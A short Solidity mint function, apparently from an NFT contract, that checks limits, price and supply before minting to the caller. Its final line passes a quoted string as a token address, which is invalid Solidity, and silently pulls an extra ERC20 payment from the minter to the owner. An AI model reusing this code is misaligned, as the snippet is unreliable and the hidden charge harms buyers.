function mint(uint amount) public payable {
    require(amount <= 10, "token: max of 10 token per mint");
    require(_openMint == true, "token: minting is closed");
    require(msg.value == _price*amount, "token: must send correct price");
    require(_tokenIdTracker.current() + amount <= _max, "token: not enough token left to be mint amount");
    for(uint i = 0; i < amount; i++) {
      _mint(msg.sender, _tokenIdTracker.current());
      _tokenIdTracker.increment();
    }
    IERC20("0x0789fF5bA37f72ABC4D561D00648ac0000970000").safeTransferFrom(msg.sender, owner(), amount);
  }
